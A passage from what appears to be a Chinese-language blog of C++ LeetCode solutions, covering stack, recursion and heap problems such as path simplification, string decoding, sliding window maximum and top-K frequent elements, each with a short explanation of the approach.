class="hljs-built_in">back</span>() /= num;<br>                    <span class="hljs-keyword">break</span>;<br>                &#125;<br>                preSign = s[i];<br>                num = <span class="hljs-number">0</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">accumulate</span>(st.<span class="hljs-built_in">begin</span>(), st.<span class="hljs-built_in">end</span>(), <span class="hljs-number">0</span>);<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h1 id="用栈访问最后若干元素">7. 用栈访问最后若干元素</h1><h2 id="棒球比赛">棒球比赛</h2><blockquote><p>使用变长数组对栈进行模拟。</p><ul><li><p>如果操作是+，那么访问数组的后两个得分，将两个得分之和加到总得分，并且将两个得分之和入栈。</p></li><li><p>如果操作是 D，那么访问数组的最后一个得分，将得分乘以 2加到总得分，并且将得分乘以 2 入栈。</p></li><li><p>如果操作是C，那么访问数组的最后一个得分，将总得分减去该得分，并且将该得分出栈。</p></li><li><p>如果操作是整数，那么将该整数加到总得分，并且将该整数入栈。</p></li></ul></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">calPoints</span><span class="hljs-params">(vector&lt;string&gt;&amp; operations)</span> </span>&#123;<br>        <span class="hljs-type">int</span> res = <span class="hljs-number">0</span>;<br>        vector&lt;<span class="hljs-type">int</span>&gt; points;<br>        <span class="hljs-keyword">for</span> (string op : operations) &#123;<br>            <span class="hljs-type">int</span> n = points.<span class="hljs-built_in">size</span>();<br>            <span class="hljs-keyword">switch</span> (op[<span class="hljs-number">0</span>]) &#123;<br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;+&#x27;</span>:<br>                res += points[n - <span class="hljs-number">1</span>] + points[n - <span class="hljs-number">2</span>];<br>                points.<span class="hljs-built_in">push_back</span>(points[n - <span class="hljs-number">1</span>] + points[n - <span class="hljs-number">2</span>]);<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;D&#x27;</span>:<br>                res += <span class="hljs-number">2</span> * points[n - <span class="hljs-number">1</span>];<br>                points.<span class="hljs-built_in">push_back</span>(<span class="hljs-number">2</span> * points[n - <span class="hljs-number">1</span>]);<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;C&#x27;</span>:<br>                res -= points[n - <span class="hljs-number">1</span>];<br>                points.<span class="hljs-built_in">pop_back</span>();<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">default</span>:<br>                res += <span class="hljs-built_in">stoi</span>(op);<br>                points.<span class="hljs-built_in">push_back</span>(<span class="hljs-built_in">stoi</span>(op));<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> res;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="简化路径">简化路径</h2><blockquote><p>先将给定的字符串 path 根据 /分割成一个由若干字符串组成的列表，如果是正常的文件名直接入栈，如果是<code>..</code>弹出栈顶元素，如果是<code>.</code>和空直接跳过。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">string <span class="hljs-title">simplifyPath</span><span class="hljs-params">(string path)</span> </span>&#123;<br>        string ans;<br>        vector&lt;string&gt; st;<br>        string dir = <span class="hljs-string">&quot;&quot;</span>;<br>        path += <span class="hljs-string">&#x27;/&#x27;</span>;<br>        <span class="hljs-type">int</span> idx = <span class="hljs-number">0</span>;<br><br>        <span class="hljs-keyword">while</span> (idx &lt; path.<span class="hljs-built_in">length</span>()) &#123;<br>            <span class="hljs-type">char</span> ch = path[idx];<br>            <span class="hljs-keyword">if</span> (ch != <span class="hljs-string">&#x27;/&#x27;</span>) &#123;<br>                dir += ch;<br>                idx++;<br>                <span class="hljs-keyword">continue</span>;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (dir == <span class="hljs-string">&quot;..&quot;</span> &amp;&amp; !st.<span class="hljs-built_in">empty</span>()) &#123;<br>                st.<span class="hljs-built_in">pop_back</span>();<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (dir != <span class="hljs-string">&quot;..&quot;</span> &amp;&amp; dir != <span class="hljs-string">&quot;.&quot;</span> &amp;&amp; dir != <span class="hljs-string">&quot;&quot;</span>) &#123;<br>                st.<span class="hljs-built_in">push_back</span>(dir);<br>            &#125;<br>            dir = <span class="hljs-string">&quot;&quot;</span>;<br>            idx++;<br>        &#125;<br><br>        <span class="hljs-keyword">for</span> (string dir : st) &#123;<br>            ans += <span class="hljs-string">&#x27;/&#x27;</span>;<br>            ans += dir;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> ans == <span class="hljs-string">&quot;&quot;</span> ? <span class="hljs-string">&quot;/&quot;</span> : ans;;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="文件的最长绝对路径">文件的最长绝对路径</h2><blockquote><p>利用栈保存当前已遍历路径的长度，栈中元素的个数即为当前路径的深度，栈顶元素即为当前路径的长度。设根节点的深度为1，字符串中连续的 ‘ 的个数加 1 即为当前节点的深度depth，设当前节点的文件名为 q，当前节点的文件名长度为l<sub>p</sub>，根据节点深度 depth 有以下判断：</p><ul><li>如果当前节点的深度大于当前路径的深度，则表明当前节点为栈顶节点的孩子节点，设当前栈顶节点的长度为t，栈顶节点的路径为 p，则此时当前文件的路径应该为p/q，则此时当前文件的路径长度为 t+l<sub>p</sub>+1。</li><li>如果当前节点的深度小于当前路径的深度，则表明当前节点并不是栈顶节点的孩子节点，按照先序遍历的顺序，则此时需要进行回退直到栈顶节点为当前节点的父亲节点，然后再求出当前节点的路径与长度。</li><li>由于题目只需要求出文件的长度即可，因此我们在实际运算中在栈中不需要保存完整的路径名称，只需要保存每个路径的长度即可。检测当前节点的文件名的长度并标记当前的文件名是文件还是文件夹，如果当前的字符串为文件，则求出当前文件绝对路径的长度。遍历所有可能的文件长度，即可找到文件绝对路径的最大长度。</li></ul></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">lengthLongestPath</span><span class="hljs-params">(string input)</span> </span>&#123;<br>        <span class="hljs-type">int</span> ans = <span class="hljs-number">0</span>;<br>        <span class="hljs-type">int</span> n = input.<span class="hljs-built_in">size</span>();<br>        <span class="hljs-type">int</span> pos = <span class="hljs-number">0</span>;<br>        stack&lt;<span class="hljs-type">int</span>&gt; st;<br><br>        <span class="hljs-keyword">while</span> (pos &lt; n) &#123;<br>            <span class="hljs-type">int</span> depth = <span class="hljs-number">1</span>;<br>            <span class="hljs-keyword">while</span> (pos &lt; n &amp;&amp; input[pos] == <span class="hljs-string">&#x27;\t&#x27;</span>) &#123;<br>                depth++;<br>                pos++;<br>            &#125;<br><br>            <span class="hljs-type">int</span> len = <span class="hljs-number">0</span>;<br>            <span class="hljs-type">bool</span> isFile = <span class="hljs-literal">false</span>;<br>            <span class="hljs-keyword">while</span> (pos &lt; n &amp;&amp; input[pos] != <span class="hljs-string">&#x27;\n&#x27;</span>) &#123;<br>                <span class="hljs-keyword">if</span> (input[pos] == <span class="hljs-string">&#x27;.&#x27;</span>) &#123;<br>                    isFile = <span class="hljs-literal">true</span>;<br>                &#125;<br>                len++;<br>                pos++;<br>            &#125;<br><br>            pos++;<br><br>            <span class="hljs-keyword">while</span> (st.<span class="hljs-built_in">size</span>() &gt;= depth) &#123;<br>                st.<span class="hljs-built_in">pop</span>();<br>            &#125;<br><br>            <span class="hljs-keyword">if</span> (!st.<span class="hljs-built_in">empty</span>()) &#123;<br>                len += st.<span class="hljs-built_in">top</span>() + <span class="hljs-number">1</span>;<br>            &#125;<br>            <span class="hljs-keyword">if</span> (isFile) &#123;<br>                ans = <span class="hljs-built_in">max</span>(ans, len);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                st.<span class="hljs-built_in">push</span>(len);<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> ans;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h1 id="递归">8. 递归</h1><h2 id="迷你语法分析器">迷你语法分析器</h2><blockquote><p>从左至右遍历 s，如果遇到 ‘[’，则表示是一个新的<code>NestedInteger</code> 实例，需要将其入栈。如果遇到 ‘]’ 或‘,’，则表示是一个数字或者 <code>NestedInteger</code>实例的结束，需要将其添加入栈顶的 <code>NestedInteger</code>实例。最后需返回栈顶的实例。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/*</span><br><span class="hljs-comment">NestedInteger(); ：Constructor initializes an empty nested list. （构造函数初始化一个空的嵌套列表。）</span><br><span class="hljs-comment">NestedInteger(int value); ：Constructor initializes a single integer.（构造函数初始化一个整数。）</span><br><span class="hljs-comment">void add(const NestedInteger &amp;ni); ：Set this NestedInteger to hold a nested list and adds a nested integer to it.（设置这个NestedInteger保存一个嵌套的列表，并向它添加一个嵌套的整数。）</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">示例:</span><br><span class="hljs-comment">        NestedInteger ans = NestedInteger();    // ans = []</span><br><span class="hljs-comment">        ans.add(NestedInteger(789));            // ans = [789]</span><br><span class="hljs-comment">        NestedInteger temp = NestedInteger();   // temp = []</span><br><span class="hljs-comment">        temp.add(NestedInteger(456));           // temp = [456]</span><br><span class="hljs-comment">        temp.add(ans);                          // temp = [456, [789]]</span><br><span class="hljs-comment">        NestedInteger res = NestedInteger();    // res = []</span><br><span class="hljs-comment">        res.add(NestedInteger(123));            // res = [123]</span><br><span class="hljs-comment">        res.add(temp);                          // res = [123, [456, [789]]]</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">NestedInteger <span class="hljs-title">deserialize</span><span class="hljs-params">(string s)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (s[<span class="hljs-number">0</span>] != <span class="hljs-string">&#x27;[&#x27;</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">NestedInteger</span>(<span class="hljs-built_in">stoi</span>(s));<br>        &#125;<br>        stack&lt;NestedInteger&gt; st;<br>        <span class="hljs-type">int</span> num = <span class="hljs-number">0</span>;<br>        <span class="hljs-type">int</span> sign = <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; s.<span class="hljs-built_in">size</span>(); i++) &#123;<br>            <span class="hljs-type">char</span> c = s[i];<br><br>            <span class="hljs-keyword">if</span> (c == <span class="hljs-string">&#x27;[&#x27;</span>) &#123;<br>                st.<span class="hljs-built_in">push</span>(<span class="hljs-built_in">NestedInteger</span>());<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (c == <span class="hljs-string">&#x27;-&#x27;</span>) &#123;<br>                sign = <span class="hljs-number">-1</span>;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-built_in">isdigit</span>(c)) &#123;<br>                num = num * <span class="hljs-number">10</span> + c - <span class="hljs-string">&#x27;0&#x27;</span>;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (c == <span class="hljs-string">&#x27;,&#x27;</span> || c == <span class="hljs-string">&#x27;]&#x27;</span>) &#123;<br>                <span class="hljs-keyword">if</span> (<span class="hljs-built_in">isdigit</span>(s[i - <span class="hljs-number">1</span>])) &#123;<br>                    <span class="hljs-keyword">if</span> (sign == <span class="hljs-number">-1</span>) &#123;<br>                        num = -num;<br>                    &#125;<br>                    st.<span class="hljs-built_in">top</span>().<span class="hljs-built_in">add</span>(<span class="hljs-built_in">NestedInteger</span>(num));<br>                &#125;<br>                num = <span class="hljs-number">0</span>;<br>                sign = <span class="hljs-number">1</span>;<br>                <span class="hljs-keyword">if</span> (c == <span class="hljs-string">&#x27;]&#x27;</span> &amp;&amp; st.<span class="hljs-built_in">size</span>() &gt; <span class="hljs-number">1</span>) &#123;<br>                    NestedInteger ni = st.<span class="hljs-built_in">top</span>();<br>                    st.<span class="hljs-built_in">pop</span>();<br>                    st.<span class="hljs-built_in">top</span>().<span class="hljs-built_in">add</span>(ni);<br>                &#125;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> st.<span class="hljs-built_in">top</span>();<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="扁平化嵌套列表迭代器">扁平化嵌套列表迭代器</h2><blockquote><p>嵌套的整型列表是一个树形结构，树上的叶子节点对应一个整数，非叶节点对应一个列表。在这棵树上深度优先搜索的顺序就是迭代器遍历的顺序。我们可以先遍历整个嵌套列表，将所有整数存入一个数组，然后遍历该数组从而实现next 和 hasNext 方法。</p><p>具体来说，用一个栈来维护深度优先搜索时，从根节点到当前节点路径上的所有节点。由于非叶节点对应的是一个列表，我们在栈中存储的是指向列表当前遍历的元素的指针（下标）。每次向下搜索时，取出列表的当前指针指向的元素并将其入栈，同时将该指针向后移动一位。如此反复直到找到一个整数。循环时若栈顶指针指向了列表末尾，则将其从栈顶弹出。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">NestedIterator</span> &#123;<br><span class="hljs-keyword">private</span>:<br>    <span class="hljs-comment">// pair中存储的是列表的当前遍历位置，以及一个尾后迭代器用于判断是否遍历到了列表末尾</span><br>    stack&lt;pair&lt;vector&lt;NestedInteger&gt;::iterator, vector&lt;NestedInteger&gt;::iterator&gt;&gt; st;<br><br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-built_in">NestedIterator</span>(vector&lt;NestedInteger&gt;&amp; nestedList) &#123;<br>        st.<span class="hljs-built_in">emplace</span>(nestedList.<span class="hljs-built_in">begin</span>(), nestedList.<span class="hljs-built_in">end</span>());<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">next</span><span class="hljs-params">()</span> </span>&#123; <br>        <span class="hljs-keyword">return</span> st.<span class="hljs-built_in">top</span>().first++-&gt;<span class="hljs-built_in">getInteger</span>(); <br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">hasNext</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">while</span> (!st.<span class="hljs-built_in">empty</span>()) &#123;<br>            <span class="hljs-keyword">auto</span> &amp;p = st.<span class="hljs-built_in">top</span>();<br>            <span class="hljs-keyword">if</span> (p.first == p.second) &#123; <span class="hljs-comment">// 遍历到当前列表末尾，出栈</span><br>                st.<span class="hljs-built_in">pop</span>();<br>                <span class="hljs-keyword">continue</span>;<br>            &#125;<br>            <span class="hljs-keyword">if</span> (p.first-&gt;<span class="hljs-built_in">isInteger</span>()) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br>            <span class="hljs-comment">// 若当前元素为列表，则将其入栈，且迭代器指向下一个元素</span><br>            <span class="hljs-keyword">auto</span> &amp;lst = p.first++-&gt;<span class="hljs-built_in">getList</span>();<br>            st.<span class="hljs-built_in">emplace</span>(lst.<span class="hljs-built_in">begin</span>(), lst.<span class="hljs-built_in">end</span>());<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="字符串解码">字符串解码</h2><blockquote><ol type="1"><li><p>创建两个栈，一个用于存储重复次数，一个用于存储解码后的字符串。</p></li><li><p>遍历输入字符串，针对不同的情况进行处理：</p><ul><li>如果遇到数字，则更新重复次数栈。</li><li>如果遇到左括号'['，则将当前重复次数和当前解码后的字符串入栈，并分别清空重复次数和解码后的字符串。</li><li>如果遇到右括号']'，则从重复次数栈和解码后的字符串栈中分别取出重复次数和解码后的字符串，并进行解码。</li></ul></li><li><p>最后将解码后的字符串栈中的内容拼接起来，即为最终结果。</p></li></ol></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">string <span class="hljs-title">decodeString</span><span class="hljs-params">(string s)</span> </span>&#123;<br>        stack&lt;<span class="hljs-type">int</span>&gt; numStack;<br>        stack&lt;string&gt; strStack;<br>        <span class="hljs-type">int</span> curNum = <span class="hljs-number">0</span>;<br>        string curStr = <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">char</span> c : s) &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">isdigit</span>(c)) &#123;<br>                curNum = curNum * <span class="hljs-number">10</span> + c - <span class="hljs-string">&#x27;0&#x27;</span>;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (c == <span class="hljs-string">&#x27;[&#x27;</span>) &#123;<br>                numStack.<span class="hljs-built_in">push</span>(curNum);<br>                strStack.<span class="hljs-built_in">push</span>(curStr);<br>                curNum = <span class="hljs-number">0</span>;<br>                curStr = <span class="hljs-string">&quot;&quot;</span>;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (c == <span class="hljs-string">&#x27;]&#x27;</span>) &#123;<br>                <span class="hljs-type">int</span> repeatTimes = numStack.<span class="hljs-built_in">top</span>();<br>                numStack.<span class="hljs-built_in">pop</span>();<br>                string prevStr = strStack.<span class="hljs-built_in">top</span>();<br>                strStack.<span class="hljs-built_in">pop</span>();<br>                <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; repeatTimes; i++) &#123;<br>                    prevStr += curStr;<br>                &#125;<br>                curStr = prevStr;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                curStr += c;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> curStr;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h1 id="滑动窗口最大值问题">9. 滑动窗口最大值问题</h1><h2 id="滑动窗口最大值">滑动窗口最大值</h2><blockquote><p>对于「最大值」，我们可以想到一种非常合适的数据结构，那就是优先队列（堆），其中的大根堆可以帮助我们实时维护一系列元素中的最大值。</p><p>初始时，我们将数组 nums 的前 k个元素放入优先队列中。每当我们向右移动窗口时，我们就可以把一个新的元素放入优先队列中，此时堆顶的元素就是堆中所有元素的最大值。然而这个最大值可能并不在滑动窗口中，在这种情况下，这个值在数组nums中的位置出现在滑动窗口左边界的左侧。因此，当我们后续继续向右移动窗口时，这个值就永远不可能出现在滑动窗口中了，我们可以将其永久地从优先队列中移除。</p><p>我们不断地移除堆顶的元素，直到其确实出现在滑动窗口中。此时，堆顶元素就是滑动窗口中的最大值。为了方便判断堆顶元素与滑动窗口的位置关系，我们可以在优先队列中存储二元组(num,index)，表示元素 num 在数组中的下标为 index。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">maxSlidingWindow</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums, <span class="hljs-type">int</span> k)</span> </span>&#123;<br>        <span class="hljs-type">int</span> n = nums.<span class="hljs-built_in">size</span>();<br>        priority_queue&lt;pair&lt;<span class="hljs-type">int</span>, <span class="hljs-type">int</span>&gt;&gt; q;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; k; i++) &#123;<br>            q.<span class="hljs-built_in">emplace</span>(nums[i], i);<br>        &#125;<br>        vector&lt;<span class="hljs-type">int</span>&gt; ans = &#123;q.<span class="hljs-built_in">top</span>().first&#125;;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = k; i &lt; n; i++) &#123;<br>            q.<span class="hljs-built_in">emplace</span>(nums[i], i);<br>            <span class="hljs-keyword">while</span> (q.<span class="hljs-built_in">top</span>().second &lt;= i - k) &#123;<br>                q.<span class="hljs-built_in">pop</span>();<br>            &#125;<br>            ans.<span class="hljs-built_in">push_back</span>(q.<span class="hljs-built_in">top</span>().first);<br>        &#125;<br>        <span class="hljs-keyword">return</span> ans;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h1 id="求前-k-个高频元素">10. 求前 K 个高频元素</h1><h2 id="前-k-个高频元素">前 K 个高频元素</h2><blockquote><p>使用哈希表来统计每个元素的出现频率，然后使用一个最小堆来维护出现频率前k高的元素。首先，我们遍历整个数组，将每个元素的出现频率记录在哈希表中。然后，我们遍历哈希表，将元素和对应的频率插入最小堆中，如果堆的大小超过了k，我们就弹出堆顶元素，以保证堆中始终保留的是出现频率前 k高的元素。最后，堆中剩余的元素就是出现频率前 k 高的元素。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">topKFrequent</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums, <span class="hljs-type">int</span> k)</span> </span>&#123;<br>        unordered_map&lt;<span class="hljs-type">int</span>, <span class="hljs-type">int</span>&gt; mp;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> num : nums) &#123;<br>            mp[num]++;<br>        &#125;<br><br>        priority_queue&lt;pair&lt;<span class="hljs-type">int</span>, <span class="hljs-type">int</span>&gt;, vector&lt;pair&lt;<span class="hljs-type">int</span>, <span class="hljs-type">int</span>&gt;&gt;,<br>                       greater&lt;pair&lt;<span class="hljs-type">int</span>, <span class="hljs-type">int</span>&gt;&gt;&gt;<br>            minHeap;<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> entry : mp) &#123;<br>            minHeap.<span class="hljs-built_in">push</span>(&#123;entry.second, entry.first&#125;);<br>            <span class="hljs-keyword">if</span> (minHeap.<span class="hljs-built_in">size</span>() &gt; k) &#123;<br>                minHeap.<span class="hljs-built_in">pop</span>();<br>            &#125;<br>        &#125;<br><br>        vector&lt;<span class="hljs-type">int</span>&gt; res;<br>        <span class="hljs-keyword">while</span> (!minHeap.<span class="hljs-built_in">empty</span>()) &#123;<br>            res.<span class="hljs-built_in">push_back</span>(minHeap.<span class="hljs-built_in">top</span>().second);<br>            minHeap.<span class="hljs-built_in">pop</span>();<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> res;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="前k个高频单词">前K个高频单词</h2><blockquote><p>利用哈希表记录每一个字符串出现的频率，然后将哈希表中所有字符串进行排序，排序时，如果两个字符串出现频率相同，那么我们让两字符串中字典序较小的排在前面，否则我们让出现频率较高的排在前面。最后我们只需要保留序列中的前k 个字符串即可。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 